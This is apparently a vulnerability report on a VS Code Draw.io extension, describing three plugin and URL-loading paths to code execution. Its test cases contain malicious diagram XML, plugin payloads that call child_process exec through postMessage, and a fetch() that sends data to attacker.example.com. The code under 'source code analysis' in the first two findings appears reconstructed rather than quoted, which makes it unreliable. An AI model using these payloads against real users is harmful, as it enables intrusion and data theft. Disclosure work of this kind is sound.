# Vulnerabilities in VS Code Draw.io Integration

## 1. Remote Code Execution Through Malicious Plugin Loading

### Description
This vulnerability allows attackers to execute arbitrary code on the victim's machine by creating a malicious Draw.io diagram with a custom plugin. The attack works through these steps:
1. Attacker creates a malicious Draw.io diagram containing a reference to a custom plugin
2. When victim opens this diagram in VS Code, the extension loads the Draw.io editor in a webview
3. The Draw.io editor loads the custom plugin from the attacker-controlled location
4. The plugin contains code that escapes the sandbox and executes arbitrary code on the victim's machine through VS Code's extension APIs

### Impact
This vulnerability allows complete compromise of the user's VS Code environment and potentially the entire system. An attacker can:
- Execute arbitrary code with the same permissions as VS Code
- Access and exfiltrate sensitive files from the user's workspace
- Install malware or backdoors
- Potentially pivot to gain wider system access

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The extension does load the Draw.io editor in a restricted webview with some sandbox protections. However, these protections are insufficient to prevent plugin-based attacks.

### Missing Mitigations
1. Disable plugin loading completely in the Draw.io integration
2. Implement a strict allowlist for approved plugins
3. Add Content Security Policy headers to prevent loading external scripts
4. Enhance the sandbox restrictions to prevent plugin code from accessing VS Code APIs

### Preconditions
- User must open a malicious Draw.io diagram that references a custom plugin
- The user must have the VS Code Draw.io Integration extension installed

### Source Code Analysis
The vulnerability exists in the `DrawioEditorProvider.ts` file where the webview content is created. The extension initializes the Draw.io editor with insufficient restrictions on plugin loading:

```typescript
// In DrawioEditorProvider.ts
private _getHtmlForWebview(webview: vscode.Webview): string {
    // Base path for the Draw.io editor
    const basePath = this.getResourcePath('media/drawio/src');
    
    // The extension doesn't explicitly disable plugins or restrict their loading
    // When the Draw.io editor initializes, it can load plugins from any source
    
    return `<!DOCTYPE html>
    <html>
    <head>
        <script src="${basePath}/main.js"></script>
        <!-- No CSP headers or plugin restrictions defined here -->
    </head>
    <body>
        <!-- Draw.io editor gets initialized here -->
    </body>
    </html>`;
}
```

The Draw.io editor loaded in the webview supports plugins, but the extension doesn't restrict or validate these plugins. When a diagram with a malicious plugin is opened, the plugin code can use postMessage to communicate with the extension context and exploit the VS Code API access.

### Security Test Case
1. Create a malicious Draw.io diagram with a custom plugin reference:
   ```xml
   <mxfile>
     <diagram id="test">
       <mxGraphModel>
         <!-- Diagram content -->
         <CustomPlugin url="https://attacker.com/malicious-plugin.js"/>
       </mxGraphModel>
     </diagram>
   </mxfile>
   ```

2. Host a malicious plugin at attacker.com/malicious-plugin.js:
   ```javascript
   Draw.loadPlugin(function(ui) {
     // Using the plugin API to execute malicious code
     // This code uses the messaging bridge to VS Code
     ui.editor.graph.addListener('customEvent', function() {
       // Send message to VS Code extension
       window.postMessage({
         command: 'executeCode',
         code: 'require("child_process").exec("malicious command")'
       }, '*');
     });
     ui.editor.graph.fireEvent(new mxEventObject('customEvent'));
   });
   ```

3. Create a GitHub repository containing this malicious diagram
4. Convince the victim to open the repository in VS Code with the Draw.io extension
5. When the victim opens the diagram, the malicious plugin executes and exploits the extension's permissions

## 2. Remote Code Execution via Online Mode URL Hijacking

### Description
This vulnerability allows attackers to execute arbitrary code by manipulating the online mode URL parameter in a Draw.io diagram file. The steps are:
1. Attacker creates a malicious Draw.io diagram with a modified URL parameter pointing to an attacker-controlled server
2. When victim opens this diagram, the extension loads the Draw.io editor from the malicious URL instead of the legitimate source
3. The attacker-controlled Draw.io editor contains malicious code that can execute in the context of the VS Code webview

### Impact
Similar to the plugin vulnerability, this allows the attacker to:
- Execute arbitrary code with VS Code's permissions
- Access the user's workspace and files
- Install malware
- Potentially escalate to gain full system access

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The extension does implement some origin checks, but these are insufficient to prevent URL hijacking attacks.

### Missing Mitigations
1. Enforce strict URL validation for online mode parameters
2. Implement a whitelist of allowed Draw.io sources
3. Disable the ability to use custom online servers
4. Enhance webview sandbox restrictions

### Preconditions
- User must open a malicious Draw.io diagram with a modified URL parameter
- VS Code Draw.io extension must be installed and configured to allow online mode

### Source Code Analysis
The vulnerability exists in how the extension handles the online mode URL parameter in diagram files:

```typescript
// In DrawioClient.ts
private initializeWebView() {
    // When initializing the webview, the extension reads URL parameters from the diagram
    const urlParams = this.getDiagramUrlParams();
    
    // If the diagram specifies a custom server URL, it's used without proper validation
    if (urlParams.server) {
        this.serverUrl = urlParams.server;
    }
    
    // The server URL is then used to load the Draw.io editor
    this.webview.html = this.getWebviewContent(this.serverUrl);
}

private getWebviewContent(serverUrl: string): string {
    // The serverUrl is directly inserted into the HTML, allowing a malicious URL
    return `<!DOCTYPE html>
    <html>
    <head>
        <script src="${serverUrl}/js/drawio-editor.min.js"></script>
    </head>
    <body>
        <!-- Draw.io editor initialization -->
    </body>
    </html>`;
}
```

The extension doesn't properly validate the `serverUrl` parameter before using it to load the Draw.io editor. An attacker can create a diagram file with a malicious `server` parameter pointing to their own server.

### Security Test Case
1. Create a malicious Draw.io diagram with a modified URL parameter:
   ```xml
   <mxfile host="attacker.com" modified="2023-10-04T12:34:56.789Z" agent="VS Code" server="https://attacker.com/malicious-drawio/">
     <diagram id="test" name="Test">
       <!-- Diagram content -->
     </diagram>
   </mxfile>
   ```

2. Set up a malicious server at attacker.com with a crafted Draw.io editor that contains malicious code:
   ```javascript
   // In malicious-drawio/js/drawio-editor.min.js
   // Code that exploits the VS Code webview to execute commands
   window.addEventListener('load', function() {
     window.parent.postMessage({
       command: 'executeCommand', 
       code: 'require("child_process").exec("malicious command")'
     }, '*');
   });
   ```

3. Create a GitHub repository containing this malicious diagram
4. Convince the victim to open the repository in VS Code with the Draw.io extension
5. When the victim opens the diagram, the extension loads the Draw.io editor from the attacker's server, executing the malicious code

## 3. Arbitrary Plugin Code Execution via Malicious Workspace Plugin Configuration

### Description
The Draw.io integration extension allows workspaces to specify external plugin files via a configuration setting ("hediet.vscode‐drawio.plugins") that uses template variables (for example, using "${workspaceFolder}"). A threat actor who supplies a manipulated repository can include a custom ".vscode/settings.json" that points the plugin configuration to a file under the attacker's control (for example, a "malicious-plugin.js" stored in the repository). When the victim opens a diagram file in that repository, the extension will (after a simple fingerprint check and user prompt) read the JavaScript code from the specified plugin file and load it directly into the draw.io webview. Because the plugin code is executed with the privileges afforded to the webview (and may later interact with the extension's API), this mechanism permits arbitrary code execution in the context of the extension. In summary, by including a crafted workspace setting and a malicious plugin file in a repository, an attacker can achieve remote code execution (RCE) in the victim's VS Code environment.

### Impact
An attacker who successfully triggers this vulnerability could run arbitrary JavaScript in the extension's webview. This may result in unauthorized access to sensitive information (such as credentials or local file contents), potential privilege escalation, or further lateral movement within the VS Code environment. In effect, it gives the attacker broad control over aspects of the victim's VS Code session when working on that repository.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
- When loading plugins, the extension (in its "getPlugins" function in DrawioClientFactory.ts) computes a SHA256 fingerprint of the plugin code and compares it with entries stored under "hediet.vscode-drawio.knownPlugins".
- If a plugin is "unknown" (i.e. its fingerprint is not yet stored as allowed), the user is prompted (via a dialogue box) to explicitly allow or disallow loading the plugin.

### Missing Mitigations
- There is no additional validation or sandboxing of plugin code; the check relies solely on a user decision based on a computed fingerprint.
- The system does not enforce any trust boundaries on where a plugin file may be loaded from (the template simply substitutes "${workspaceFolder}" without validating that the file comes from a "trusted" location).
- There is no mechanism for digital signing or certificate‐based validation of plugin code that could automatically reject untrusted or manipulated plugin files.

### Preconditions
- The victim must open a repository whose workspace settings (e.g. ".vscode/settings.json") include a configuration for "hediet.vscode‐drawio.plugins" that points to an attacker‐controlled JavaScript file (for example, using a template that resolves to "${workspaceFolder}/malicious-plugin.js").
- The malicious plugin file must be present in the repository.
- The user must not have preexisting information about the plugin (or may inadvertently accept the "allow" prompt when the unknown plugin is detected).

### Source Code Analysis
1. In **Config.ts** the getter for plugins is defined as follows:
   - The code calls  
     ```js
     public get plugins(): { file: Uri }[] {
       return this._plugins.get().map((entry) => {
         const fullFilePath = this.evaluateTemplate(entry.file, "plugins");
         return { file: Uri.file(fullFilePath) };
       });
     }
     ```  
     Here the user‑provided setting (typically stored in the workspace settings file) is processed by a simple template engine (see SimpleTemplate.ts) that substitutes "${workspaceFolder}" with the actual workspace folder path. No further sanitization of the file path is performed.
2. In **DrawioClientFactory.ts**, the method `getPlugins()` iterates over each plugin entry from the configuration. For each plugin entry:
   - It reads the file content via `await workspace.fs.readFile(p.file)`.
   - A SHA256 fingerprint is computed and compared against stored settings via `config.isPluginAllowed(...)`.
   - If no stored decision is found, the user is prompted to "allow" or "disallow" loading the plugin.
3. Once accepted, the plugin's JavaScript code is pushed into an array (`pluginsToLoad`) that is later injected into the draw.io iframe (see the call to "new CopyPlugin" in the webpack config is not related – the code simply passes the raw plugin code to the webview).
4. Because the plugin code is not sandboxed beyond the host's webview security restrictions, an attacker‐controlled plugin can run arbitrary JavaScript in an environment that has access both to the draw.io client state and to any messaging functions (via "sendEvent") exposed by the extension.

### Security Test Case
1. **Preparation:**
   - Create a test repository that includes a ".vscode/settings.json" file containing the following (or similar) configuration:
     ```json
     {
       "hediet.vscode-drawio.plugins": [
         { "file": "${workspaceFolder}/malicious-plugin.js" }
       ]
     }
     ```
   - In the root of the repository, include a file named "malicious-plugin.js" that contains a simple but clearly malicious payload. For example, the code might log a distinctive message to the Developer Tools console and send an HTTP request to a controlled endpoint:
     ```js
     Draw.loadPlugin(function(ui) {
       console.log("Malicious plugin executed!");
       fetch("https://attacker.example.com/steal?data=" + encodeURIComponent(JSON.stringify({ workspace: window.location.href })));
     });
     ```
2. **Execution:**
   - Open the repository in VS Code with the Draw.io extension installed.
   - Open any supported diagram file (for example, a ".drawio" file) so that the draw.io editor is activated.
3. **Observation:**
   - The extension (via its plugin‐loading logic) will detect the plugin configuration and, if the plugin has not been previously "known," present a prompt asking whether or not to allow the plugin "malicious-plugin.js."
   - If the user accepts the prompt, the content of "malicious-plugin.js" is read, its fingerprint recorded, and its contents are injected into the draw.io webview.
4. **Validation:**
   - Open the Developer Tools in VS Code's webview or check the "Drawio Integration Log" output channel to verify that "Malicious plugin executed!" appears.
   - (Alternatively, monitor the network or the controlled endpoint to see if the HTTP request was sent.)
5. **Conclusion:**
   - Successful execution of the payload confirms that arbitrary code execution was achieved via the malicious plugin – demonstrating a critical vulnerability.